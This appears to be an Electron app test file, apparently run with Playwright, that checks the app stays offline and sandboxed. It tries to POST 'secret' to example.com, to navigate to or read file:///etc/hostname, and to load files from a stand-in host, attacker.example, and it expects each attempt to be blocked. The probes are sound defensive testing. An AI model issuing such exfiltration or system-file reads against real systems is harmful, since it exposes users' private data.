import { existsSync } from 'node:fs'
import { expect, newProject, test } from './helpers'

test('everything stays on this computer: projects are local files and no request can leave', async ({ h }) => {
  const { app, page } = h
  const path = await newProject(h, 'Private')
  expect(existsSync(path)).toBe(true)

  // Neither the page nor the main process can reach the internet.
  const fromPage = await page.evaluate(() =>
    fetch('https://example.com/collect', { method: 'POST', body: 'secret' }).then(
      () => 'sent',
      () => 'blocked'
    )
  )
  expect(fromPage).toBe('blocked')
  const fromMain = await app.evaluate(({ net }) =>
    net.fetch('https://example.com/collect', { method: 'POST', body: 'secret' }).then(
      () => 'sent',
      () => 'blocked'
    )
  )
  expect(fromMain).toBe('blocked')

  // A link can't turn the window into a web page; it goes to the browser instead
  // (stubbed: a real browser starting would keep the app from closing).
  await app.evaluate(({ shell }) => {
    const opened: string[] = []
    ;(globalThis as { opened?: string[] }).opened = opened
    shell.openExternal = async (url: string) => void opened.push(url)
  })
  await page.evaluate(() => void (window.location.href = 'https://example.com/'))
  await expect.poll(() => app.evaluate(() => (globalThis as { opened?: string[] }).opened)).toEqual(['https://example.com/'])
  const shown = await app.evaluate(async ({ BrowserWindow }) => {
    const contents = BrowserWindow.getAllWindows()[0]!.webContents
    return { url: contents.getURL(), text: (await contents.executeJavaScript('document.body.innerText')) as string }
  })
  expect(shown.url).toMatch(/^file:/)
  expect(shown.text).toContain('Private')

  // Nor into another file (a link in a shared project, a dropped file), which would get the app's bridge; and the app's page
  // can't read files beyond its own, or another computer's (on Windows, a network share).
  const page0 = shown.url
  await page.evaluate(() => void (window.location.href = 'file:///etc/hostname'))
  await page.evaluate(() => void (window.location.href = 'file://attacker.example/share/evil.html'))
  await page.waitForTimeout(300)
  expect(await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0]!.webContents.getURL())).toBe(page0)
  const reads = await page.evaluate(() =>
    Promise.all(
      ['file:///etc/hostname', 'file://attacker.example/share/x.png'].map((url) =>
        fetch(url).then(
          () => 'read',
          () => 'blocked'
        )
      )
    )
  )
  expect(reads).toEqual(['blocked', 'blocked'])
})
